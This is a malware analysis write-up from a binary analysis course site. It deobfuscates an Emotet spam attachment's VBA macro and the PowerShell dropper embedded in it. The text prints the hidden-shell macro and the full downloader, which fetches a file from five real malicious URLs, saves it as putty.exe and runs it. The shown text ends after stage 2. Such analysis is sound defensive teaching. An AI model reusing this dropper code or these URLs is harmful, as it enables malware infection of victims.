<li class="page_item page-item-1007"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/automatic-string-formatting-deobfuscation/">PowerShell string formatting deobfuscation</a></li>
<li class="page_item page-item-2764"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/javascript-string-concatenation-deobfuscation/">JavaScript string concatenation deobfuscation</a></li>
<li class="page_item page-item-3061"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/automatic-rezer0-payload-and-configuration-extraction/">Automatic ReZer0 payload and configuration extraction</a></li>
<li class="page_item page-item-3206"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-decrypt-strings-in-amadey-1-09/">Ghidra script to decrypt strings in Amadey 1.09</a></li>
<li class="page_item page-item-3521"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-decrypt-a-string-array-in-xor-ddos/">Ghidra script to decrypt a string array in XOR DDoS</a></li>
<li class="page_item page-item-3974"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-handle-stack-strings/">Ghidra script to handle stack strings</a></li>
	</ul>
</li>
<li class="page_item page-item-3978 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/">Malware snippets<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3982"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/self-deletion/">Self Deletion</a></li>
<li class="page_item page-item-3984"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/api-hashing/">API Hashing</a></li>
	</ul>
</li>
<li class="page_item page-item-1250 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/obtaining-samples/">Obtaining samples<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1253"><a href="https://maxkersten.nl/binary-analysis-course/obtaining-samples/searching-samples/">Searching samples</a></li>
	</ul>
</li>
<li class="page_item page-item-2096 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/documentation/">Documentation<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-2099"><a href="https://maxkersten.nl/binary-analysis-course/documentation/article-structure/">Article structure</a></li>
	</ul>
</li>
<li class="page_item page-item-480"><a href="https://maxkersten.nl/binary-analysis-course/resources/">Resources</a></li>
<li class="page_item page-item-473"><a href="https://maxkersten.nl/binary-analysis-course/faq/">FAQ</a></li>
<li class="page_item page-item-1490 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/">Miscellaneous<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1493"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2018-2019/">A year in review: 2018-2019</a></li>
<li class="page_item page-item-2697"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2019-2020/">A year in review: 2019-2020</a></li>
<li class="page_item page-item-3467"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2020-2021/">A year in review: 2020-2021</a></li>
<li class="page_item page-item-4031"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2021-2022/">A year in review: 2021-2022</a></li>
	</ul>
</li>
</ul>
</li>
<li class="page_item page-item-4353"><a href="https://maxkersten.nl/libras-ghidra-library/">Libra&#8217;s Ghidra Library</a></li>
<li class="page_item page-item-161 menu-item-has-children"><a href="https://maxkersten.nl/projects/">Projects<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-793"><a href="https://maxkersten.nl/projects/androidprojectcreator/">AndroidProjectCreator</a></li>
<li class="page_item page-item-3295 menu-item-has-children"><a href="https://maxkersten.nl/projects/m3-framework/">m3 framework<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3292"><a href="https://maxkersten.nl/projects/m3-framework/extending-m3/">Extending m3</a></li>
<li class="page_item page-item-3329"><a href="https://maxkersten.nl/projects/m3-framework/anubis-and-cerberus-explained/">Anubis and Cerberus explained</a></li>
	</ul>
</li>
<li class="page_item page-item-3128 menu-item-has-children"><a href="https://maxkersten.nl/projects/api-client-libraries/">API client libraries<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3351"><a href="https://maxkersten.nl/projects/api-client-libraries/hatching-triage-java-api-client/">Hatching Triage Java API client</a></li>
<li class="page_item page-item-3353"><a href="https://maxkersten.nl/projects/api-client-libraries/malshare-java-api-client/">MalShare Java API client</a></li>
<li class="page_item page-item-3700"><a href="https://maxkersten.nl/projects/api-client-libraries/malware-bazaar-java-api-client/">Malware Bazaar Java API client</a></li>
<li class="page_item page-item-4185"><a href="https://maxkersten.nl/projects/api-client-libraries/yaraify-java-api-client/">Yaraify Java API client</a></li>
	</ul>
</li>
<li class="page_item page-item-2876"><a href="https://maxkersten.nl/projects/malwaretheflag/">MalwareTheFlag</a></li>
<li class="page_item page-item-2145"><a href="https://maxkersten.nl/projects/responsible-disclosures/">Responsible Disclosures</a></li>
<li class="page_item page-item-2430"><a href="https://maxkersten.nl/projects/malpull/">MalPull</a></li>
<li class="page_item page-item-104 menu-item-has-children"><a href="https://maxkersten.nl/projects/capricorn/">Capricorn<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-109"><a href="https://maxkersten.nl/projects/capricorn/changelog/">Changelog</a></li>
	</ul>
</li>
<li class="page_item page-item-2141 menu-item-has-children"><a href="https://maxkersten.nl/projects/archive/">Archive<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-163"><a href="https://maxkersten.nl/projects/archive/shouldersurfer/">ShoulderSurfer</a></li>
<li class="page_item page-item-167"><a href="https://maxkersten.nl/projects/archive/stringer/">Stringer</a></li>
<li class="page_item page-item-16 menu-item-has-children"><a href="https://maxkersten.nl/projects/archive/gemini/">Gemini<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
		<ul class='children'>
<li class="page_item page-item-73"><a href="https://maxkersten.nl/projects/archive/gemini/changelog/">Changelog</a></li>
		</ul>
</li>
<li class="page_item page-item-35"><a href="https://maxkersten.nl/projects/archive/whitepapers/">Whitepapers</a></li>
	</ul>
</li>
</ul>
</li>
<li class="page_item page-item-4 menu-item-has-children"><a href="https://maxkersten.nl/about-me/">About me<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-2436"><a href="https://maxkersten.nl/about-me/news-and-conferences/">News and conferences</a></li>
<li class="page_item page-item-198"><a href="https://maxkersten.nl/about-me/privacy-policy/">Privacy Policy</a></li>
</ul>
</li>
		</ul>
	</div><!-- .main-nav -->
			</div><!-- .inside-navigation -->
	</nav><!-- #site-navigation -->
		
	<div id="page" class="hfeed site grid-container container grid-parent">
		<div id="content" class="site-content">
			
	<div id="primary" class="content-area grid-parent mobile-grid-100 grid-75 tablet-grid-75">
		<main id="main" class="site-main">
						
				
<article id="post-1079" class="post-1079 page type-page status-publish" itemtype='http://schema.org/CreativeWork' itemscope='itemscope'>
	<div class="inside-article">
				
					<header class="entry-header">
				<h1 class="entry-title" itemprop="headline">Emotet droppers</h1>			</header><!-- .entry-header -->
				
				<div class="entry-content" itemprop="text">
			<p><em>This article was published on the 16th of February 2019. This article was updated on the 19th of March 2020, and on the 3rd of November 2021.</em></p>
<p>The Emotet trojan has been active for multiple years and has delivered numerous payloads. In the beginning, the trojan injected itself during the payment process of a purchase, but over the years the malware has transitioned to also drop other trojans. At the time of writing, the main spreading method is via spam campaigns. The e-mails contain a malicious attachment that is often referred to as an invoice.</p>
<h2>Table of contents</h2>
<ul>
<li><a href="#sample-information">Sample information</a></li>
<li><a href="#prerequisite-php">Prerequisite &#8211; PHP</a></li>
<li><a href="#stage-1-the-malicious-macro">Stage 1 &#8211; The malicious macro</a></li>
<li><a href="#stage-2-the-dropped-powershell-script">Stage 2 &#8211; The dropped Powershell script</a></li>
<li><a href="#stage-3-the-wrongly-configured-website">Stage 3 &#8211; The wrongly configured website</a></li>
<li><a href="#stage-4-returning-the-payload">Stage 4 &#8211; Returning the payload</a></li>
<li><a href="#stage-5-the-binary">Stage 5 &#8211; The binary</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
<p><a name ="sample-information"></a></p>
<h2><a href="#sample-information">Sample information</a></h2>
<p>The samples were shared with me by <em>b1nary</em> on Telegram. Note that URLs in the macro differ from the wrongly configured website that is analysed later on. This has no influence on the analysis, but it is pointed out for transparency. One can download all the required files from <a href="https://beta.virusbay.io/sample/browse/52b94921d9e57a2009fb0c562aab25bc">VirusBay</a>, <a href="https://bazaar.abuse.ch/sample/59c3bb00017dd3bb1abd4d42d9a50df24fcd320bacf5335d1c030b772dc796c5/">Malware Bazaar</a>, or <a href="https://malshare.com/sample.php?action=detail&#038;hash=52b94921d9e57a2009fb0c562aab25bc">MalShare</a>. Details are given below.</p>
<pre>
MD5: 52b94921d9e57a2009fb0c562aab25bc

SHA-1: 32bcf8bbf7a5a3e88f4025179f4be9445b8e7ec8

SHA-256: 59c3bb00017dd3bb1abd4d42d9a50df24fcd320bacf5335d1c030b772dc796c5
</pre>
<p><a name ="prerequisite-php"></a></p>
<h2><a href="#prerequisite-php">Prerequisite &#8211; PHP</a></h2>
<p>Later on, PHP files will be analysed and executed to obtain data. For those following along, PHP needs to be installed. To install PHP on Debian based systems, one can simply use the command that is given below.</p>
<pre>
sudo apt-get install php7.2-cli
</pre>
<p>For Windows, the information is given on the PHP site, which can be found <a href="https://secure.php.net/manual/en/install.windows.legacy.index.php#install.windows.legacy.manual">here</a>.</p>
<p><a name ="stage-1-the-malicious-macro"></a></p>
<h2><a href="#stage-1-the-malicious-macro">Stage 1 &#8211; The malicious macro</a></h2>
<p>The attachment, which was received on the first of February 2019, is named <em>Factura_OS-0689.doc</em>. Upon opening it (with macros disabled, on a non Windows based system to avoid an accidental infection), a social engineering attempt becomes apparent. Below, the text within the image is given.</p>
<pre>
This document is protected

To open the document,
follow these steps:

This document is only available for desktop op laptop versions of Microsoft Office word

Click Enable editing button from the yellow bar above

Once you have enabled editing, please click Enable content button from the yellow bar above
</pre>
<p>Aside from the oddly phrased sentences, this is an obvious attempt to lure an unsuspecting victim into executing the payload of the document.</p>
<p>The document contains one form (named <em>f</em>), three modules (<em>d40tNZH</em>, <em>tzUxn</em> and <em>VCAZiq</em>) with a single function in each module (respectively <em>wFjUXJ</em>, <em>KKZUbw</em> and <em>love</em>). To ensure the execution of the macro when the file is opened, the <em>Document_Open</em> event is used. The code that is executed when this event is triggered, is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="vb"><pre class="de1">Rem Attribute VBA_ModuleType=VBADocumentModule
<span class="kw2">Option</span> VBASupport 1
&nbsp;
<span class="kw2">Sub</span> Document_Open()
&nbsp;
<span class="kw3">If</span> 45 * 13 = 3562 - 3555 <span class="kw3">Then</span>
tDtKeGn = <span class="st0">&quot;q6Cxy&quot;</span>
<span class="kw3">End</span> <span class="kw3">If</span>
<span class="kw4">Dim</span> tu96ocCK <span class="kw4">As</span> <span class="kw1">Single</span>
tu96ocCK = Round(20521.794670846)
&nbsp;
<span class="kw4">Dim</span> hAanT8Em2 <span class="kw4">As</span> <span class="kw1">Double</span>
hAanT8Em2 = Sgn(58540.935390342)
<span class="kw4">Dim</span> HMkjb <span class="kw4">As</span> <span class="kw1">Long</span>
HMkjb = (3330 / 370) + (6)
love <span class="st0">&quot;o&quot;</span>
<span class="kw3">End</span> <span class="kw2">Sub</span></pre></div></div></div></div></div></div></div>


<p>At first, multiple variables are declared and instantiated. None of them are used within the code after the instantiation. The function <em>love</em> is called at last, with a single parameter: the string <em>o</em>. The code for the <em>love</em> function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="vb"><pre class="de1">Rem Attribute VBA_ModuleType=VBAModule
<span class="kw2">Option</span> VBASupport 1
<span class="kw2">Sub</span> love(IdZALGS)
<span class="kw4">Dim</span> EQUqVg9N <span class="kw4">As</span> <span class="kw1">String</span>
EQUqVg9N = Len(YLPIkZX87)
<span class="kw4">Dim</span> yDnCg14 <span class="kw4">As</span> <span class="kw1">Long</span>
yDnCg14 = (818 - 791) - (13)
<span class="kw4">Dim</span> yD7Emk2X5 <span class="kw4">As</span> <span class="kw1">Long</span>
yD7Emk2X5 = -833133810
<span class="kw4">Dim</span> T7056ZwR <span class="kw4">As</span> <span class="kw1">Long</span>
T7056ZwR = Sgn(0)
<span class="kw4">Dim</span> sBoDH7mZK <span class="kw4">As</span> <span class="kw1">Boolean</span>
sBoDH7mZK = <span class="kw5">False</span>
cVMhaxQv = <span class="st0">&quot;w&quot;</span>
<span class="kw2">Call</span> Shell(KKZUbw(1) &amp; IdZALGS &amp; cVMhaxQv &amp; wFjUXJ, 0)
<span class="kw3">End</span> <span class="kw2">Sub</span></pre></div></div></div></div></div></div></div>


<p>The lay-out of this function is similar to the previous one, in the sense that it first declares and instantiates multiple variables which are never used. Note that the function argument <em>IdZALGS</em> is used and equals <em>o</em>. The <em>Call Shell</em> method contains all the malicious content.<br />
The second argument (the <em>0</em>) sets the window mode of the shell. The value zero equals <em>vbHide</em>, meaning the shell window is hidden from the user.</p>
<p>Below, the functions <em>KKZUbw(1)</em> and <em>wFjUXJ</em> are analysed. The variable <em>cVMhaxQv</em> equals <em>w</em>, as it is set to in the line above the <em>Call Shell</em> function. The shell command, in which the two known variables are replaced by their value, is given below for context.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="vb"><pre class="de1"><span class="kw2">Call</span> Shell(KKZUbw(1) &amp; <span class="st0">&quot;o&quot;</span> &amp; <span class="st0">&quot;w&quot;</span> &amp; wFjUXJ, 0)</pre></div></div></div></div></div></div></div>


<p>The code for <em>KKZUbw</em> is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="vb"><pre class="de1">Rem Attribute VBA_ModuleType=VBAModule
<span class="kw2">Option</span> VBASupport 1
<span class="kw2">Public</span> <span class="kw2">Function</span> KKZUbw(OVOcS <span class="kw4">As</span> <span class="kw1">Integer</span>)
<span class="kw4">Dim</span> FC4Vz <span class="kw4">As</span> <span class="kw1">Integer</span>
FC4Vz = Sgn(-24987)
KKZUbw = <span class="st0">&quot;p&quot;</span>
<span class="kw3">End</span> <span class="kw2">Function</span></pre></div></div></div></div></div></div></div>


<p>The provided variable <em>OVOcS</em> equals <em>1</em>, as it was passed from <em>love</em>. Both the provided argument and the integer <em>FC4Vz</em> are never used. The function <em>KKZUbw</em> is set to equal <em>p</em>, which is the return value.</p>
<p>For additional context, the shell command with substituted variables, is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="vb"><pre class="de1"><span class="kw2">Call</span> Shell(<span class="st0">&quot;p&quot;</span> &amp; <span class="st0">&quot;o&quot;</span> &amp; <span class="st0">&quot;w&quot;</span> &amp; wFjUXJ, 0)</pre></div></div></div></div></div></div></div>


<p>The last function that is called, is <em>wFjUXJ</em>. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="vb"><pre class="de1">Rem Attribute VBA_ModuleType=VBAModule
<span class="kw2">Option</span> VBASupport 1
<span class="kw2">Public</span> <span class="kw2">Function</span> wFjUXJ()
<span class="kw4">Dim</span> ohw7OLNTg <span class="kw4">As</span> <span class="kw1">Object</span>
<span class="kw4">Set</span> ohw7OLNTg = <span class="kw2">New</span> f
<span class="kw4">Dim</span> YVyOsk <span class="kw4">As</span> <span class="kw1">String</span>
YVyOsk = ohw7OLNTg.de.Text
wFjUXJ = YVyOsk
<span class="kw3">End</span> <span class="kw2">Function</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>ohw7OLNTg</em> is first declared as a generic object. One line later, it is defined as <em>f</em>, the form object within the document. The form has a button, named <em>es</em>, which displays the text <em>Cc3KM</em>. Additionally, a textbox with the name <em>de</em> is present. The text within the textbox is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="powershell"><pre class="de1">ershell <span class="re0">$u5XQYhS</span> <span class="sy0">=</span> <span class="st0">'$IY2E4 = new-obj6236.9355943074ect -com6236.9355943074obj6236.9355943074ect wsc6236.9355943074ript.she6236.9355943074ll;$WrDq5hf = new-object sys6236.9355943074tem.net.web6236.9355943074client;$h2JAbj3E = new-object random;$Lcik8RtZ = \&quot;6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://pro-course.ru/7WN7n1n,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://tapchisuckhoengaynay.com/wp-admin/Attachments/FJhztkIS,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://de.thevoucherstop.com/TxJjRtZj,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://3kiloafvallen.nl/wwfuZp3g,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://uckelecorp.com/QNTVLmNmt\&quot;.spl6236.9355943074it(\&quot;,\&quot;);$zKrReq4A = $h2JAbj3E.nex6236.9355943074t(1, 65536);$XqzWsIE = \&quot;c:\win6236.9355943074dows\temp\put6236.9355943074ty.exe\&quot;;for6236.9355943074each($VZxSuD9 in $Lcik8RtZ){try{$WrDq5hf.dow6236.9355943074nlo6236.9355943074adf6236.9355943074ile($VZxSuD9.ToS6236.9355943074tring(), $XqzWsIE);sta6236.9355943074rt-pro6236.9355943074cess $XqzWsIE;break;}catch{}}'</span>.replace<span class="br0">&#40;</span><span class="st0">'6236.9355943074'</span><span class="sy0">,</span> <span class="re0">$xZGUua</span><span class="br0">&#41;</span>;$Zvg3H6 <span class="sy0">=</span> <span class="st0">''</span>;<span class="kw2">iex</span><span class="br0">&#40;</span><span class="re0">$u5XQYhS</span><span class="br0">&#41;</span>;</pre></div></div></div></div></div></div></div>


<p>Since the <em>pow</em> should be in front, the first word in the string is <em>powershell</em>.</p>
<p>The complete script is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="powershell"><pre class="de1">powershell <span class="re0">$u5XQYhS</span> <span class="sy0">=</span> <span class="st0">'$IY2E4 = new-obj6236.9355943074ect -com6236.9355943074obj6236.9355943074ect wsc6236.9355943074ript.she6236.9355943074ll;$WrDq5hf = new-object sys6236.9355943074tem.net.web6236.9355943074client;$h2JAbj3E = new-object random;$Lcik8RtZ = \&quot;6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://pro-course.ru/7WN7n1n,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://tapchisuckhoengaynay.com/wp-admin/Attachments/FJhztkIS,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://de.thevoucherstop.com/TxJjRtZj,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://3kiloafvallen.nl/wwfuZp3g,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://uckelecorp.com/QNTVLmNmt\&quot;.spl6236.9355943074it(\&quot;,\&quot;);$zKrReq4A = $h2JAbj3E.nex6236.9355943074t(1, 65536);$XqzWsIE = \&quot;c:\win6236.9355943074dows\temp\put6236.9355943074ty.exe\&quot;;for6236.9355943074each($VZxSuD9 in $Lcik8RtZ){try{$WrDq5hf.dow6236.9355943074nlo6236.9355943074adf6236.9355943074ile($VZxSuD9.ToS6236.9355943074tring(), $XqzWsIE);sta6236.9355943074rt-pro6236.9355943074cess $XqzWsIE;break;}catch{}}'</span>.replace<span class="br0">&#40;</span><span class="st0">'6236.9355943074'</span><span class="sy0">,</span> <span class="re0">$xZGUua</span><span class="br0">&#41;</span>;$Zvg3H6 <span class="sy0">=</span> <span class="st0">''</span>;<span class="kw2">iex</span><span class="br0">&#40;</span><span class="re0">$u5XQYhS</span><span class="br0">&#41;</span>;</pre></div></div></div></div></div></div></div>


<p><a name ="stage-2-the-dropped-powershell-script"></a></p>
<h2><a href="#stage-2-the-dropped-powershell-script">Stage 2 &#8211; The dropped Powershell script</a></h2>
<p>The Powershell code is best read with a couple of new lines, as is seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="powershell"><pre class="de1"><span class="re0">$u5XQYhS</span> <span class="sy0">=</span> <span class="st0">'$IY2E4 = new-obj6236.9355943074ect -com6236.9355943074obj6236.9355943074ect wsc6236.9355943074ript.she6236.9355943074ll;$WrDq5hf = new-object sys6236.9355943074tem.net.web6236.9355943074client;$h2JAbj3E = new-object random;$Lcik8RtZ = \&quot;6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://pro-course.ru/7WN7n1n,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://tapchisuckhoengaynay.com/wp-admin/Attachments/FJhztkIS,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://de.thevoucherstop.com/TxJjRtZj,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://3kiloafvallen.nl/wwfuZp3g,6236.9355943074h6236.9355943074t6236.9355943074t6236.9355943074p6236.9355943074://uckelecorp.com/QNTVLmNmt\&quot;.spl6236.9355943074it(\&quot;,\&quot;);$zKrReq4A = $h2JAbj3E.nex6236.9355943074t(1, 65536);$XqzWsIE = \&quot;c:\win6236.9355943074dows\temp\put6236.9355943074ty.exe\&quot;;for6236.9355943074each($VZxSuD9 in $Lcik8RtZ){try{$WrDq5hf.dow6236.9355943074nlo6236.9355943074adf6236.9355943074ile($VZxSuD9.ToS6236.9355943074tring(), $XqzWsIE);sta6236.9355943074rt-pro6236.9355943074cess $XqzWsIE;break;}catch{}}'</span>
			.replace<span class="br0">&#40;</span><span class="st0">'6236.9355943074'</span><span class="sy0">,</span> <span class="re0">$xZGUua</span><span class="br0">&#41;</span>;
<span class="re0">$Zvg3H6</span> <span class="sy0">=</span> <span class="st0">''</span>;
<span class="kw2">iex</span><span class="br0">&#40;</span><span class="re0">$u5XQYhS</span><span class="br0">&#41;</span>;</pre></div></div></div></div></div></div></div>


<p>The variable <em>$xZGUua</em> is equal to nothing, hence the string <em>6236.9355943074</em> is simply removed from the code above. Doing so results in readable code. To improve readability, simply replace the semicolons with <em>;\n</em> in a text editor. After each command, a new line is added. The readable code is given below. </p>
<p>Note that <em>iex($u5XQYhS);</em> is used to execute the Powershell script that is described below. The function <em>iex</em> stands for <em>Invoke-Expression</em>, as can be seen in the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6">Microsoft documentation</a>. Below, the script that will be executed is analysed.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="powershell"><pre class="de1"><span class="re0">$IY2E4</span> <span class="sy0">=</span> <span class="kw1">new-object</span> <span class="kw5">-comobject</span> wscript.shell;
<span class="re0">$WrDq5hf</span> <span class="sy0">=</span> <span class="kw1">new-object</span> system.net.webclient;
<span class="re0">$h2JAbj3E</span> <span class="sy0">=</span> <span class="kw1">new-object</span> random;
<span class="re0">$Lcik8RtZ</span> <span class="sy0">=</span> \<span class="st0">&quot;http://pro-course.ru/7WN7n1n,http://tapchisuckhoengaynay.com/wp-admin/Attachments/FJhztkIS,http://de.thevoucherstop.com/TxJjRtZj,http://3kiloafvallen.nl/wwfuZp3g,http://uckelecorp.com/QNTVLmNmt\&quot;</span>.split<span class="br0">&#40;</span>\<span class="st0">&quot;,\&quot;</span><span class="br0">&#41;</span>;
<span class="re0">$zKrReq4A</span> <span class="sy0">=</span> <span class="re0">$h2JAbj3E</span>.next<span class="br0">&#40;</span><span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">65536</span><span class="br0">&#41;</span>;
<span class="re0">$XqzWsIE</span> <span class="sy0">=</span> \<span class="st0">&quot;c:\windows\temp\putty.exe\&quot;</span>;
<span class="kw3">foreach</span><span class="br0">&#40;</span><span class="re0">$VZxSuD9</span> <span class="kw3">in</span> <span class="re0">$Lcik8RtZ</span><span class="br0">&#41;</span><span class="br0">&#123;</span>
	try<span class="br0">&#123;</span>
		<span class="re0">$WrDq5hf</span>.downloadfile<span class="br0">&#40;</span><span class="re0">$VZxSuD9</span>.ToString<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">,</span> <span class="re0">$XqzWsIE</span><span class="br0">&#41;</span>;
		start<span class="sy0">-</span>process <span class="re0">$XqzWsIE</span>;
		<span class="kw3">break</span>;
	<span class="br0">&#125;</span>catch<span class="br0">&#123;</span><span class="br0">&#125;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The first three variables, <em>$IY2E4</em>, <em>$WrDq5hf</em> and <em>$h2JAbj3E</em>, can be renamed based on the object types. Their new names are, respectively, <em>$wscriptShell</em>,  <em>$webClient</em> and <em>$randomGenerator</em>.</p>
<p>The next variable, <em>$Lcik8RtZ</em>, is a string of URLs which is split, returning an array of URLs. Hence, it can be renamed to <em>$urlArray</em>.</p>
<p>The result of the random generator ranges between 1 and 65535, since the last value is the limit, which is excluded from the possible result. This equals the maximum value of a sixteen bit unsigned integer (<em>uint16_t</em>): two to the power 16. The result of the random generator is saved in the variable <em>$zKrReq4A</em>. This variable can be refactored to <em>$randomNumber</em>.</p>
<p>Lastly, the variable <em>$XqzWsIE</em> is equal to the path where the file is downloaded to and executed from. As such, it can be refactored to <em>$downloadedFile</em>. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="powershell"><pre class="de1"><span class="re0">$wscriptShell</span> <span class="sy0">=</span> <span class="kw1">new-object</span> <span class="kw5">-comobject</span> wscript.shell;
<span class="re0">$webClient</span> <span class="sy0">=</span> <span class="kw1">new-object</span> system.net.webclient;
<span class="re0">$randomGenerator</span> <span class="sy0">=</span> <span class="kw1">new-object</span> random;
<span class="re0">$urlArray</span> <span class="sy0">=</span> \<span class="st0">&quot;http://pro-course.ru/7WN7n1n,http://tapchisuckhoengaynay.com/wp-admin/Attachments/FJhztkIS,http://de.thevoucherstop.com/TxJjRtZj,http://3kiloafvallen.nl/wwfuZp3g,http://uckelecorp.com/QNTVLmNmt\&quot;</span>.split<span class="br0">&#40;</span>\<span class="st0">&quot;,\&quot;</span><span class="br0">&#41;</span>;
<span class="re0">$randomNumber</span> <span class="sy0">=</span> <span class="re0">$randomGenerator</span>.next<span class="br0">&#40;</span><span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">65536</span><span class="br0">&#41;</span>;
<span class="re0">$downloadedFile</span> <span class="sy0">=</span> \<span class="st0">&quot;c:\windows\temp\putty.exe\&quot;</span>;
<span class="kw3">foreach</span><span class="br0">&#40;</span><span class="re0">$url</span> <span class="kw3">in</span> <span class="re0">$urlArray</span><span class="br0">&#41;</span><span class="br0">&#123;</span>
	try<span class="br0">&#123;</span>
		<span class="re0">$webClient</span>.downloadfile<span class="br0">&#40;</span><span class="re0">$url</span>.ToString<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">,</span> <span class="re0">$downloadedFile</span><span class="br0">&#41;</span>;
		start<span class="sy0">-</span>process <span class="re0">$downloadedFile</span>;
		<span class="kw3">break</span>;
	<span class="br0">&#125;</span>catch<span class="br0">&#123;</span><span class="br0">&#125;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The script cycles through all the domain names and tries to download the next stage to the victim&#8217;s computer, more specifically to <em>C:\windows\temp\putty.exe</em>. If the download succeeds, the downloaded file is executed. If an error occurs, the next URL is tried since the catch clause is left empty. If all of the URLs are unavailable, the script terminates and the victim&#8217;s device remains unaffected.</p>
